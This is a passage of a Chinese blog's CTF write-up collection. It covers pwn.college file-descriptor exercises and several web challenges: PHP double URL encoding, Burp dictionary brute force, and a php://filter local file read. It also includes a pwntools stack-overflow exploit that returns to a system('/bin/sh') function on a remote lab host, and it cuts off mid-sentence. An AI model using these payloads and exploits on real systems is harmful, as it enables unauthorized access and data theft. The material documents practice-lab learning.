leave\\n\");\n    } else { // 父进程\n        printf(\"parent pid is %d\\n\", getpid());\n\n        // 等待子进程退出\n        waitpid(childPid, NULL, 0);\n\n        printf(\"ok, I am father, I will leave\\n\");\n    }\n\n    return 0;\n}\n\n```\n\n## 语法\n\nopen()方法语法格式如下：\n\nos.open(file, flags[, mode]);\n\n## 参数\n\nfile – 要打开的文件\n\nflags – 该参数可以是以下选项，多个使用 “|” 隔开：\n\n- os.O_RDONLY: 以只读的方式打开\n- os.O_WRONLY: 以只写的方式打开\n- os.O_RDWR : 以读写的方式打开\n- os.O_NONBLOCK: 打开时不阻塞\n- os.O_APPEND: 以追加的方式打开\n- os.O_CREAT: 创建并打开一个新文件\n- os.O_TRUNC: 打开一个文件并截断它的长度为零（必须有写权限）\n- os.O_EXCL: 如果指定的文件存在，返回错误\n- os.O_SHLOCK: 自动获取共享锁\n- os.O_EXLOCK: 自动获取独立锁\n- os.O_DIRECT: 消除或减少缓存效果\n- os.O_FSYNC : 同步写入\n- os.O_NOFOLLOW: 不追踪软链接\n\n### Level③④\n\n```c\n#define _GNU_SOURCE\n#include <stdio.h>\n#include <stdlib.h>\n#include <sys/wait.h>\n#include <unistd.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\n\nvoid pwncollege() {\n    char *const argv[] = { \"/challenge/embryoio_level34\", NULL };\n    const char *file = \"/challenge/embryoio_level34\";\n\n    execvp(file, argv);\n\n    perror(\"execvp\");\n    exit(EXIT_FAILURE);\n}\n\nint main(int argc, char *argv[], char *env[]) {\n    pid_t childPid;\n    int old_fd = open(\"/tmp/sayucj\", O_RDONLY);\n    if (old_fd == -1) {\n        perror(\"open\");\n        return 1;\n    }\n\n  \n    dup2(old_fd, STDIN_FILENO);\n    close(old_fd);\n\n    childPid = fork();\n    if (childPid < 0) {\n        perror(\"fork\");\n        return 1;\n    } else if (childPid == 0) { \n        printf(\"child pid is %d\\n\", getpid());\n\n   \n        pwncollege();\n\n        \n        printf(\"ok, I am child, I will leave\\n\");\n    } else { \n        printf(\"parent pid is %d\\n\", getpid());\n\n        \n        waitpid(childPid, NULL, 0);\n\n        printf(\"ok, I am father, I will leave\\n\");\n    }\n\n    return 0;\n}\n\n```\n\n```c\n#define _GMU_SOURCE\n#include<stdio.h>\n#include<stdlib.h>\n#include<sys/wait.h>\n#include<unistd.h>\n#include<sys/types.h>\n#include<sys/stat.h>\n#include<fcntl.h>\nvoid pwncollege(){\nchar*const argv[]={\"/challenge/embryoio_level34\",NULL};\nconst char* file=\"/challenge/embryoio_level34\";\nexecvp(file,argv);\n}\nint main(int argc,char **argv[],char*env[])\n{\nint childPid;\nint old_fd=open(\"/tmp/sayucj\",O_WRONLY);\ndup2(old_fd,1);\nif (fork()==0){\nchildPid=getpid();\nprintf(\"child pid is %d\\n\",childPid);\npwncollege();\nprintf(\"ok,i am child,i will leave\\n\");\n}else{\nprintf(\"parent pid is %d\\n\",getpid());\nwaitpid(childPid,NULL,0);\nprintf(\"ok,i am father ,i will leave\\n\");\nreturn 0;\n}\n}\n```\n\n\n\n### Level③⑤\n\n```c\n#define _GNU_SOURCE\n#include <stdio.h>\n#include <stdlib.h>\n#include <sys/wait.h>\n#include <unistd.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\n\n// 定义用于执行特定二进制文件的函数\nvoid pwncollege() {\n    char *const argv[] = { \"/challenge/embryoio_level35\", NULL };  // 指定要执行的二进制文件和参数\n    const char *file = \"/challenge/embryoio_level35\";  // 二进制文件的路径\n\n    // 关闭标准输出文件描述符\n    close(1);\n\n    // 使用 execvp 函数执行指定的二进制文件\n    execvp(file, argv);\n\n    // 如果 execvp 失败，输出错误信息并退出程序\n    perror(\"execvp\");\n    exit(EXIT_FAILURE);\n}\n\nint main(int argc, char *argv[], char *env[]) {\n    pid_t childPid;\n    \n    // 打开或创建用于输出的文件，设置文件权限为只读写用户\n    int old_fd = open(\"/tmp/1\", O_WRONLY | O_CREAT | O_TRUNC, S_IRUSR | S_IWUSR);\n    if (old_fd == -1) {\n        perror(\"open\");\n        return 1;\n    }\n\n    // 将文件描述符 old_fd 重定向为标准输出\n    dup2(old_fd, 1);\n    close(old_fd);\n\n    // 清空除 LC_CTYPE 外的环境变量\n    char *new_env[] = { \"LC_CTYPE=en_US.UTF-8\", NULL };\n\n    // 创建子进程\n    childPid = fork();\n    if (childPid < 0) {\n        perror(\"fork\");\n        return 1;\n    } else if (childPid == 0) { \n        printf(\"child pid is %d\\n\", getpid());\n\n        // 清空环境变量后再执行 pwncollege 函数\n        execve(\"/challenge/embryoio_level34\", argv, new_env);\n\n        // 如果 execve 失败，输出错误信息并退出程序\n        perror(\"execve\");\n        exit(EXIT_FAILURE);\n    } else { \n        printf(\"parent pid is %d\\n\", getpid());\n\n        // 等待子进程退出\n        waitpid(childPid, NULL, 0);\n\n        printf(\"ok, I am father, I will leave\\n\");\n    }\n\n    return 0;\n}\n\n```\n\nor\n\n```c\n#define _GNU_SOURCE\n#include <stdio.h>\n#include <stdlib.h>\n#include <sys/wait.h>\n#include <unistd.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\n\n// 定义用于执行特定二进制文件的函数\nvoid pwncollege() {\n    const char *argv[] = { \"/challenge/embryoio_level35\", NULL };  // 指定要执行的二进制文件和参数\n    const char *file = \"/challenge/embryoio_level35\";  // 二进制文件的路径\n\n    // 使用 execvpe 函数执行指定的二进制文件，传递环境变量 envp\n    execvpe(file, argv, envp);\n}\n\nint main(int argc, char **argv[], char *env[]) {\n    int childPid;\n    \n    // 创建子进程\n    if (fork() == 0) {  // 在子进程中执行以下代码\n        childPid = getpid();  // 获取子进程的PID\n        printf(\"child pid is %d\\n\", childPid);  // 输出子进程的PID\n\n        pwncollege();  // 调用函数执行指定的二进制文件\n\n        printf(\"ok, I am child, I will leave\\n\");  // 子进程结束前输出信息\n    } else {  // 在父进程中执行以下代码\n        printf(\"parent pid is %d\\n\", getpid());  // 输出父进程的PID\n\n        // 使用 waitpid 函数等待子进程退出\n        waitpid(childPid, NULL, 0);\n\n        printf(\"ok, I am father, I will leave\\n\");  // 父进程结束前输出信息\n        return 0;\n    }\n}\n\n```\n\n### Level③⑥\n\n```bash\n/challenge/embryoio_level36 | cat\n```\n\n### Level③⑦\n\n```bash\n/challenge/embryoio_level37 | grep\n```\n\n### Level③⑧\n\n要先 **/bin/bash**\n\n```bash\n/challenge/embryoio_level38 | sed -ep\n```\n\nor\n\n```bash\n/challenge/embryoio_level38 | sed -e 's/pattern/replacement/g'\nsed 命令是一个强大的文本处理工具，用于对文本进行模式匹配和替换。在命令行中，使用 |（管道）将命令串联起来，可以将一个命令的输出作为另一个命令的输入。关于 sed 的 -e 选项用于指定要应用的替换操作。pattern 是要匹配的文本模式，replacement 是要替换的内容，g 表示全局替换（一行中的所有匹配都会被替换）。\n```\n\nor\n\n```bash\n/challenge/embryoio_level38 | sed -n '/pwn/p'\n使用 `sed` 命令对输入的每一行进行处理：\n\n- `-n` 选项取消默认的输出行为，使得只有经过处理的行会被输出。\n- `/pwn/` 是一个正则表达式，用于匹配包含字符串 \"pwn\" 的行。\n- `p` 是 `sed` 命令，用于输出匹配到的行。\n```\n\n","categories":["ctf"]},{"title":"攻防世界Web","url":"/2023/03/13/攻防世界web/","content":"\nWelcome\n\n<meta name=\"referrer\" content=\"no-referrer\"/>\n\n## 一、攻防世界PHP2详细解答\n\n![img](https://img-blog.csdnimg.cn/img_convert/4f5b1f4e9dae688c6325733666affff6.png)\n\n### 1.进入环境\n\n看到一句话“Can you anthenticate to this website?”意思为：你能认证到这个网站吗？\n\n![img](https://img-blog.csdnimg.cn/img_convert/055ab8d21925215fbb39bc931233b0e5.png)\n\n\n\n### 2.burpsuite\n\n用burpsuite抓包后也没有什么重要的信息o(一︿一+)o\n\n![img](https://img-blog.csdnimg.cn/img_convert/a91b4cf3fc079c1b57a12747186c0553.png)\n\n我们可以进入index.php，但页面并没有变化。\n\n于是输入index.php开始有东西出来了。\n\n![img](https://img-blog.csdnimg.cn/img_convert/75f94568c3f583d2d5a017a6ef4965ec.png)\n\n在这里可能看的不明显，我们直接回到页面在后面+/index.phps看看\n\n![img](https://img-blog.csdnimg.cn/img_convert/0188b5b682e717523d2dad59dacbc9f4.png)\n\n给出了一下代码\n\n### 3.解析代码\n\n```php\n<?php\nif(\"admin\"===$_GET[id]) {\n  echo(\"<p>not allowed!</p>\");\n  exit();\n}\n$_GET[id] = urldecode($_GET[id]);\nif($_GET[id] == \"admin\")\n{\n  echo \"<p>Access granted!</p>\";\n  echo \"<p>Key: xxxxxxx </p>\";\n}\n?>\n\nCan you anthenticate to this website?\n```\n\n只需一眼就可以看出这是一个 PHP 代码片段，用于检查用户是否具有访问网站的权限\n\n1. 第一行是 PHP 的开头标记，表示 PHP 代码的开始。\n2. 第二行检查通过 URL 传递的 'id' 参数的值是否等于 'admin'。如果它相等，则使用 'echo' 函数显示消息“not allowed!”并使用 'exit' 函数退出脚本。这是为了防止未经授权访问网站的管理员页面。\n3. 第六行使用 'urldecode' 函数解码 'id' 参数的 URL 编码值。\n4. 第七行检查 'id' 参数的解码值是否等于 'admin'。如果它相等，则使用 'echo' 函数显示消息“Access granted!”和一个密钥。\n5. 代码以 PHP 结束标记结束。\n\n咱们的目的就是求出这个密钥了( ¯▽¯；)\n\n### 4.但要注意的是这个函数**urldecode**\n\n`urldecode()` 是一个 PHP 函数，用于解码 URL 编码字符串。在 URL 中，一些字符是有特殊含义的，例如空格、问号、等号等。如果需要在 URL 中使用这些字符，就需要对其进行编码，将其转换成特定的编码格式。例如空格会被编码成 `%20`。`urldecode()` 函数可以将这些编码格式的字符解码回原始字符，以便使用或显示。\n\n在上面的 PHP 代码片段中，`urldecode()` 函数用于解码传递的 'id' 参数的 URL 编码值，以便后续判断 'id' 参数的值是否等于 'admin'。\n\n所以直接输入下面是不行的。\n\n```\nhttp://61.147.171.105:64170/?id=admin\n```\n\n我们需要将admin进行转换，也就是进行url编码。\n\nadmin 的 URL 编码是 %61%64%6d%69%6e。\n\n```\nhttp://61.147.171.105:64170/?id=%61%64%6d%69%6e\n```\n\n 还是不行滴！\n\n因为浏览器本身会进行因此url解码，这里相当于进行两次url解码，应该是\n\n```\nhttp://61.147.171.105:64170/?id=%2561%2564%256d%2569256e\n```\n\n![img](https://img-blog.csdnimg.cn/img_convert/b4489ef8ec16bef527d23f75e0847451.png)\n\n最后也是得到结果了！＼( ^▽^ )／\n\n### 5.知识总结：(✿◡‿◡)\n\n**1.后缀名为.phps的文件：phps即php source，phps文件就是php的源代码文件，通常用于提供给用户查看php代码，因为用户无法通过web浏览器直接查看到php文件的内容，所以需要用phps文件代替**\n\n2.**在传入参数时，浏览器会对非ASCII编码进行一次urlencode，结果在代码执行时，相当于id还是admin，所以我们在传参时需要进行两次URL编码**\n\n3.在URL编码中， \"%\" 符号是一个特殊字符，它被用来表示接下来的两个字符是一个ASCII值的十六进制表示。因此，如果我们想要在URL中出现一个 \"%\" 符号本身，而不是它的特殊含义，那么我们需要对它进行编码。\n\n4.对于 \"admin\" 字符串，在进行一次URL编码后，会得到 \"%61%64%6d%69%6e\" 这个字符串。如果我们想对其进行二次URL编码，可以使用 \"%25\" 来代替每个 \"%\" 符号。由于 \"%25\" 在URL编码中表示 \"%\" 符号，所以最终的二次URL编码结果为 \"%2561%2564%256d%2569%256e\"。\n\n5.另一方面，如果我们将 \"%25\" 放在 \"dmin\" 前面，会得到 \"%25dmin\"。这个字符串也可以被解码为 \"admin\"。这是因为，在进行URL解码时，系统会先解码所有出现的 \"%\" 符号，然后再将剩下的字符串解码为原始字符。因此，\"**%25dmin**\" 和 \"**%2564%6d%69%6e**\" 都可以被解码为 \"admin\"。\n\n# 二、攻防世界weak_auth浅学\n\n### 1、进入环境\n\n![img](https://img-blog.csdnimg.cn/img_convert/bf15d3dd090e744f1042f8fe674b9c4e.png)\n\n\n\n\n\n当我们点进去的时候，出来一个网页，让我们输入username和password，先随便输入一下，然后弹出是说让我们用admin作为username登入\n\n\n\n![img](https://img-blog.csdnimg.cn/img_convert/538c90a5e8799e835863e17e4a8d5996.png)\n\n\n\n那我们就按照它的要求吧，进行修改\n\n![img](https://img-blog.csdnimg.cn/img_convert/b91d986e355c99163dc0316f9f56198d.png)\n\n![img](https://img-blog.csdnimg.cn/img_convert/d7b50ac0ad9f095dc9f4d073a6d42437.png)\n\n\n\n\n\n这次它只是提醒了密码错误，我们的重心开始在密码上，什么提示也没给，没思路。。。\n\n![img](https://img-blog.csdnimg.cn/img_convert/8c1c6ddbfffb417922ae416fd00b3fa1.png)\n\n\n\n但是仔细想了想，总感觉怪怪的，他没有返回到原来的界面，事出反常必有妖，按一下F12，它给出了一段绿色的字体\n\n```plaintext\nmaybe you need a dictionary(或许你需要一个字典)\n```\n\n字典，好了，瞬间清楚明了了。\n\n\n\n### 2.首先我们应该进行抓包\n\n> **抓包（Packet Sniffing）是指通过监听网络数据包，来分析和获取网络通信的技术或行为。在网络通信中，数据包是信息传输的基本单位，抓包可以获取数据包中的各种信息，例如发送和接收的数据、通信的协议、源和目的地址等，从而帮助分析和监测网络流量，发现网络问题和安全漏洞。抓包常常被用于网络故障排查、网络安全检测、数据包分析和协议设计等领域。常用的抓包工具包括Wireshark、Tcpdump、Burp Suite等。**\n\n接下来我们就是应该用burpsuite进行字典爆破。首先先将那一页的代码发送到intruder\n\n![img](https://img-blog.csdnimg.cn/img_convert/ca8492cc37dc3c648d902ff2cf99b545.png)\n\n\n\n\n\n### 3.紧接着在intruder里的payloads里选择runtime\n\n![img](https://img-blog.csdnimg.cn/img_convert/3513eb42f7f4d4e7cf1b0afd6fc4946d.png)\n\n\n\n选择你的字典，字典可以在这里下载[字典](https://www.somd5.com/download/dict/)\n\n### 4.步骤完成后，我们就可以进行爆破了。\n\n![img](https://img-blog.csdnimg.cn/img_convert/c1cda94c56cbee95f1b5f6c2dd7ac546.png)\n\n\n\n![img](https://img-blog.csdnimg.cn/img_convert/b82b575de7e10adca668a9ac7822caca.png)\n\n\n\n爆破后，我们可以看到上图里有一个长度与其他长度不同的，至于为什么正确的密码与其他的密码长度不同，我搜集了一些知识，希望有帮助。\n\n> **在Burp Suite的字典爆破功能中，正确的密码与错误的密码在长度上可能是不同的，这可能由以下几个原因导致：**\n> **密码哈希算法的实现方式不同。不同的密码哈希算法可能会产生不同长度的哈希值，这可能会导致正确的密码哈希值长度与错误的密码哈希值长度不同。**\n> **在进行哈希计算时，使用的加盐方式不同。哈希计算时的加盐方式可能会影响哈希值长度，从而导致正确的密码哈希值长度与错误的密码哈希值长度不同。**\n> **密码本身的长度不同。如果正确的密码比错误的密码更长或更短，则其哈希值长度可能与错误的密码哈希值长度不同。**\n> **需要注意的是，密码哈希值长度不一定与密码本身长度相同。这是因为哈希算法的实现方式不同，会导致哈希值长度的差异。因此，在使用Burp Suite进行字典爆破时，我们需要考虑到以上的原因，并且针对具体情况进行调试和分析。**\n\n那我们输入123456，这就是密码，得到以下结果：\n\n![img](https://img-blog.csdnimg.cn/img_convert/f451544a3725b81e73c5e35268b667ca.png)\n\ncyberpeace{89f86db4dcb3c9311ff8f2513065533e}\n\n### 5.知识总结o(一︿一+)\n\n一、在CTF的Web题目中，有很多涉及到密码爆破的题目，一般可以从以下几个方面来判断密码爆破类型：\n\n1. 题目描述：通常题目描述中会给出一些提示，例如提示破解某个服务的密码，或者提示破解某个加密算法的密钥等。这些提示可以帮助我们确定密码爆破的类型。\n\n1. 请求响应：在使用Burp Suite等工具进行抓包分析时，可以查看请求响应，观察是否有类似密码错误、尝试次数限制等提示信息，或者观察是否有重复的请求，这些都可能是密码爆破的线索。\n\n1. 加密算法：如果题目中涉及到密码加密算法，可以通过分析算法的特点来判断密码爆破类型。例如，如果使用的是MD5加密算法，那么就可能是直接爆破明文密码或者使用彩虹表进行破解。\n\n1. 字典文件：如果题目中要求使用字典文件进行密码破解，那么可以判断为字典密码爆破类型。此时需要注意字典文件的大小和内容是否符合要求。\n\n总之，在CTF的Web题目中，需要通过分析题目描述、请求响应、加密算法和字典文件等方面，来判断密码爆破的类型，然后选择相应的工具和策略来进行破解。同时，需要遵守比赛规则，合法合规地进行破解。\n\n二、Burp Suite是一个强大的Web应用程序安全测试工具，它包括多个模块，其中之一是字典密码爆破模块。这个模块可以通过自动化的方式，在用户提供的字典文件中尝试所有可能的密码组合，以破解用户的密码。\n\n总结一下Burp Suite字典密码爆破的一些特点：\n\n1. 字典文件：Burp Suite字典密码爆破模块需要用户提供一个包含所有可能密码的字典文件。字典文件可以是一个简单的文本文件，每行包含一个密码。\n\n1. 多种破解技术：Burp Suite字典密码爆破模块支持多种破解技术，包括暴力破解、智能破解和组合破解等。不同的破解技术可以根据不同的场景和要求进行选择。\n\n1. 配置选项：Burp Suite字典密码爆破模块还提供了多种配置选项，例如：破解时使用的线程数、HTTP响应超时时间、是否跟踪成功的登录请求等。\n\n1. 破解速度：Burp Suite字典密码爆破模块的破解速度取决于多个因素，例如字典文件的大小、目标应用程序的响应速度、破解时使用的线程数等。可以通过调整这些参数来提高破解速度。\n\n1. 使用注意事项：在使用Burp Suite字典密码爆破模块时，需要注意一些使用注意事项，例如：合理设置请求间隔时间、控制破解请求的数量、合理设置破解技术和字典文件等。此外，需要遵守法律法规和道德规范，仅在授权的范围内使用此工具。\n\n总之，Burp Suite字典密码爆破模块是一个功能强大的工具，可以帮助安全测试人员发现应用程序的密码漏洞，但需要谨慎使用。","tags":["Web"],"categories":["ctf"]},{"title":"buuctfWeb","url":"/2023/03/05/web/","content":"\nWelcome\n\n<meta name=\"referrer\" content=\"no-referrer\"/>\n\n# 一、[极客大挑战 2019]Secret File 1解题思路\n\n![img](https://img-blog.csdnimg.cn/img_convert/7a7ca8cd81dfdde9a0379ea84d0d335c.png)\n\n### 1.开启靶机\n\n开启靶机后进入网址，没有什么好的信息\n\n![img](https://img-blog.csdnimg.cn/img_convert/6c5094598fefd7dd7333e2632ebff1d3.png)\n\n### 2.按F12查看源代码\n\n发现了一个网址./Archive_room.php按CTRL键点击即可进入，可以看到\n\n![img](https://img-blog.csdnimg.cn/img_convert/240faba07eaf97b3e701de1e7da7fca1.png)\n\n点击这个SECRET并没有发生什么，后面倒是说“查阅结束”，那么就说明，速度很快，肉眼看不到，那我们就要借用工具burpsuite。首先下开启代理服务器\n\n### 3.使用burpsuite![img](https://img-blog.csdnimg.cn/img_convert/ec786b401fe133c346e66ee47ba7a2ab.png)\n\n![img](https://img-blog.csdnimg.cn/img_convert/efb7f0e3de717041c1ac19d352dbbc9a.png)\n\n进入到这个界面，软件中应该显示出获取的信息，点击forward直到信息中出现action.php(根据源代码提示)\n\n![img](https://img-blog.csdnimg.cn/img_convert/906cd9cf375e974f7f0ec1d4740c68a2.png)\n\n接着将这串数据发送到repeater，在repeater里我们点击Go就进入到下面的界面\n\n![img](https://img-blog.csdnimg.cn/img_convert/ca09d303bef3505fbb8cea397dd330fb.png)\n\n后面的话我们就可以输入网址http://78b3b06a-804f-46c6-8d85-8635948e27ad.node4.buuoj.cn/secr3t.php可以查看源代码（记着要将burpsuite和局域网关闭，否则是打不开的）\n\n![img](https://img-blog.csdnimg.cn/img_convert/c1b5cbae463c8b351a02d691e55dc88b.png)\n\n### 4.代码解释\n\n这是一个PHP脚本，以HTML标签开头。该脚本包含了一个PHP函数 `highlight_file(__FILE__)`，该函数可以高亮正在执行的PHP代码。\n\n然后，该脚本设置了 `error_reporting(0)`，以关闭错误报告。\n\n该脚本通过 `$_GET` 超全局变量接收一个文件名作为参数。然后它检查文件名是否包含以下任何字符串： \"../\"、\"tp\"、\"input\" 或 \"data\"。如果包含，则脚本会打印 \"Oh no!\" 并退出。这是一种安全措施，用于防止目录遍历攻击并保护服务器免受恶意文件包含的攻击。\n\n如果文件名通过了安全检查，该脚本将使用 `include` 语句包含该文件。被包含的文件的内容将作为PHP代码执行。\n\n标志存储在名为 \"flag.php\" 的文件中，该文件可能由此脚本包含。\n\n### 5.PHP伪协议\n\n看到flag.php应该联想到[php伪协议](https://segmentfault.com/a/1190000018991087)，在后面加上\n?file=php://filter/read=convert.base64-encode/resource=flag.php即可。\n\n这是因为 php://filter/read=convert.base64-encode 是一种 PHP 伪协议，用于将文件转换为 base64 格式。通过在 $_GET 超全局变量中传递 file=php://filter/read=convert.base64-encode/resource=flag.php，我们可以读取 flag.php 文件的内容并将其转换为 base64 格式。然后，我们可以将该内容解码并查看其中是否包含有用的信息。\n\n![img](https://img-blog.csdnimg.cn/img_convert/d215ff68e0fb087898bcc6696330a751.png)\n\n就会给出一堆符号的组合，显然这是base64的密文，接着在base64解密下即可求得flag\n\n```\nPCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KCiAgICA8aGVhZD4KICAgICAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICAgICAgPHRpdGxlPkZMQUc8L3RpdGxlPgogICAgPC9oZWFkPgoKICAgIDxib2R5IHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOmJsYWNrOyI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPGgxIHN0eWxlPSJmb250LWZhbWlseTp2ZXJkYW5hO2NvbG9yOnJlZDt0ZXh0LWFsaWduOmNlbnRlcjsiPuWViuWTiO+8geS9oOaJvuWIsOaIkeS6hu+8geWPr+aYr+S9oOeci+S4jeWIsOaIkVFBUX5+fjwvaDE+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPHAgc3R5bGU9ImZvbnQtZmFtaWx5OmFyaWFsO2NvbG9yOnJlZDtmb250LXNpemU6MjBweDt0ZXh0LWFsaWduOmNlbnRlcjsiPgogICAgICAgICAgICA8P3BocAogICAgICAgICAgICAgICAgZWNobyAi5oiR5bCx5Zyo6L+Z6YeMIjsKICAgICAgICAgICAgICAgICRmbGFnID0gJ2ZsYWd7Mzk2MDEzYmItZjRkNC00NThjLWJmYWItYzhmODk4ZmI4Zjc0fSc7CiAgICAgICAgICAgICAgICAkc2VjcmV0ID0gJ2ppQW5nX0x1eXVhbl93NG50c19hX2cxcklmcmkzbmQnCiAgICAgICAgICAgID8+CiAgICAgICAgPC9wPgogICAgPC9ib2R5PgoKPC9odG1sPgo=\n```\n\n### 6.解密得到flag\n\nbase64在线解密网址：http://www.jsons.cn/base64/\n\n![img](https://img-blog.csdnimg.cn/img_convert/ee9459a1e82c5da4c32442d8ca09f316.png)\n\nflag为flag{396013bb-f4d4-458c-bfab-c8f898fb8f74}\n\n## 7、总结\n\n在做这道题的时候，主要是会使用burpsuite工具，并且还要了解PHP伪协议的一些知识及概念，最后还用到了一些密码里的base64，这些都需要了解一下。\n\n","tags":["Web"],"categories":["ctf"]},{"title":"攻防世界Pwn","url":"/2023/03/05/pwn/","content":"\nWelcom\n\n<meta name=\"referrer\" content=\"no-referrer\"/>\n\n# 一、level0\n\n#  \n\n![img](https://img-blog.csdnimg.cn/img_convert/94804d959252e33b5031fb1d2f863cdf.png)\n\n### 1.1用checksec查看\n\n下载附件，使用checksec命令查看该程序是32位还是64位，开启了哪些保护。![img](https://img-blog.csdnimg.cn/img_convert/f08a4f0a7f7d42a23a9dff948886153d.png)\n\n> **NX 代表 不可执行** (non-executable) 。它通常在 CPU 层面上启用，因此启用 NX 的操作系统可以将某些内存区域标记为不可执行。通常，缓冲区溢出漏洞将恶意代码放在堆栈上，然后尝试执行它。但是，让堆栈这些可写区域变得不可执行，可以防止这种攻击。\n\n### 1.2 ida\n\n接着我们将文件放到**IDA**64位里，用f5反汇编查看![img](https://img-blog.csdnimg.cn/img_convert/81738c64d4ff827f301111ce6955c3b6.png)\n\n代码中提示有一个vulnerable_function()函数进入查看![img](https://img-blog.csdnimg.cn/img_convert/6997c705143c0285f6d7c587636ab82c.png)\n\n显而易见此处存在栈溢出漏洞，buf的长度为128个字节（也就是0x80）但是read()函数允许往buf中输入**0x200**字节数据。\n\n> /bin/sh是一个特殊的字符串，它代表了一个Unix/Linux系统中的shell程序，通常是Bash。在pwn题中，攻击者可以通过控制程序的输入，将/bin/sh的地址作为参数传递给system函数或者execve函数，从而获取一个shell进程并执行命令。因此，/bin/sh通常被用于pwn题中的ROP（Return-oriented programming）或者其他代码执行漏洞的利用中。\n\n接着，我们shift+F12可以看到有个很可疑的/bin/sh，我们双击进去看看\n\n![img](https://img-blog.csdnimg.cn/img_convert/81b14e74550c3baab9b5d056f7b658d7.png)\n\n接着我们点击那一行后面的**callsystem**进入它的函数体\n\n![img](https://img-blog.csdnimg.cn/img_convert/cac97a368deb9ed60f0946301f9527a3.png)\n\n![img](https://img-blog.csdnimg.cn/img_convert/83f0a4d3a6264cb164ca2c775d3873b7.png)\n\n该函数调用了system(“/bin/sh”)我们可以利用此函数来get shell\n\n### **1.3整体思路：**\n\n**是向buf处输入0x80字节的数据填满buf，此时在继续输入0x80字节的数据造成溢出覆盖ebp处的数据。**\n\n**再继续输入数据把返回地址处的数据覆盖为callsystem()的地址，这样vulnerable_function()函数原本要返回到main()函数但是却返回到了callsystem()函数来执行callsystem()**\n\n### 1.4接下来开始写exp：\n\n```python\n from pwn import *\np=remote ('61.147.171.105', 54500)#连接远程\nelf = ELF('./23')#打开本地程序\npayload = b'a'*(0x80+0x8) + p64(elf.symbols['callsystem'])#构造payload 需要覆盖0x80个地址+上个ebp地址\\# 输入payload来进行操作以拿到程序的shell payload一般等于 偏移量 + 地址\np.recvuntil(\"Hello, World\\n\")#接收远程的返回\np.send(payload)#发送payload\np.interactive()\n```\n\n运行脚本得到flag!\n\n![image-20230228131023932](C:\\Users\\ASUS\\AppData\\Roaming\\Typora\\typora-user-images\\image-20230228131023932.png)\n\n**以下是我对上面exp的一些函数的总结，这也是我正在学习的象征，虽然只能做一些简单的题，不过我会加油的。**\n\n**在编写pwn题的exp代码时，通常需要调试和测试代码，因此需要输出详细的日志信息。因此，`context.log_level=\"debug\"`可以帮助开发者更好地了解代码的执行过程和结果，从而更快地发现和解决问题。**\n\n> **p.recvuntil(string)**是pwntools库中的一个函数，用于接收程序输出中的数据，直到包含指定字符串`string`的数据出现为止。具体来说，它会等待程序输出数据，并将数据缓存到一个数据缓冲区中，直到缓冲区中包含了指定的字符串`string`为止，然后返回缓冲区中的数据。如果程序输出中没有包含指定的字符串`string`，则`p.recvuntil(string)`会一直等待，直到超时或者接收到数据为止。如果超时，则会抛出一个异常。\n>\n> 在编写pwn题的exp代码时，通常需要从程序输出中获取一些敏感信息，例如栈指针、libc的基址等等。因此，可以使用`p.recvuntil(string)`函数接收程序输出中的数据，并从中提取需要的信息。通常情况下，需要多次使用`p.recvuntil(string)`函数接收程序输出中的数据，以便于获取完整的信息和数据。\n\n**需要注意的是，在使用`p.recvuntil(string)`函数时，需要确保指定的字符串`string`是唯一的，否则可能会导致接收到错误的数据或者超时。为了避免这种情况，可以使用一些特殊的字符串或者标记来区分不同的输出数据。另外，在实际使用中，需要根据程序的具体输出格式和漏洞类型，选择合适的接收函数和接收方式，以便于获取正确的数据并编写有效的exploit代码**。\n\n> **p.sendline(payload)**是pwntools库中的一个函数，用于向程序发送数据并添加一个换行符。具体来说，它会将指定的数据`payload`发送给程序，并在数据的末尾添加一个换行符`\\n`，以便于模拟用户在终端中输入数据的行为。发送数据后，函数会等待程序的响应并将响应数据缓存到一个数据缓冲区中，然后返回缓冲区中的数据。如果程序没有响应或者响应超时，则会抛出一个异常。\n>\n> 在编写pwn题的exploit代码时，通常需要向程序发送一些特定的数据，例如缓冲区溢出的payload、格式化字符串的参数等等。使用`p.sendline(payload)`函数可以将这些数据发送给程序，并使用`\\n`换行符模拟用户输入的行为。这样可以使payload或者输入数据更加真实和有效，从而更容易绕过一些安全保护和检测机制，例如ASLR和DEP等。\n\n**需要注意的是，在使用`p.sendline(payload)`函数时，需要确保发送的数据和换行符的格式是正确的，否则可能会导致程序崩溃或者无法正常运行。为了避免这种情况，可以使用一些特殊的字符或者标记来区分不同的数据，或者使用一些工具或者脚本来自动生成payload或者输入数据。另外，在实际使用中，需要根据程序的具体输入格式和漏洞类型，选择合适的发送函数和发送方式，以便于构造有效的exploit代码。**\n\n# 二、攻防世界-CGfsb\n\n\n\n![img](https://img-blog.csdnimg.cn/img_convert/82782dcc5dbbb6e04dfb0c6b48551031.png)\n\n### 1.将文件拖入ubuntu用checksec检查保护\n\n> 1. **arch：arch是“Architecture”的缩写，表示二进制文件编译时采用的CPU架构。在安全中，arch通常用于表示二进制的CPU架构是否是适合攻击者开发shellcode的目标，因为攻击者需要知道适合攻击平台的内存偏移量和指令。因此，对于一个给定的攻击目标，知道其CPU架构可以帮助攻击者更容易地开发成功的攻击。**\n> 2. **prlro：prlro是“Partial Relro”的缩写，表示二进制是否启用了Partial Relocation Read-Only保护。这种保护机制可以阻止攻击者利用GOT表重定向攻击，因为GOT表的地址被设置为只读，攻击者无法修改它。启用PRLRO可以提高二进制的安全性。**\n> 3. **sstack：sstack是“Stack Smashing Protection”的缩写，表示二进制是否启用了栈破坏保护。栈破坏是指攻击者利用缓冲区溢出漏洞来篡改函数返回地址，从而控制程序的执行流程。启用Sstack可以在执行返回前检查栈帧中的数据完整性，以避免栈破坏攻击。**\n> 4. **nx：nx是“No Execute”的缩写，表示二进制是否启用了不可执行内存保护。不可执行内存的保护可以防止攻击者将指令载入到内存中，从而造成代码执行和攻击。启用NX可以防止许多基于内存的攻击，例如ROP攻击、缓冲区溢出等。**\n\n如下图，我们发现PIE没有保护，全局变量的地址固定\n\n![img](https://img-blog.csdnimg.cn/img_convert/58910593676779651934021c00647310.png)\n\n> **PIE”指的是“位置无关可执行文件”（Position-Independent 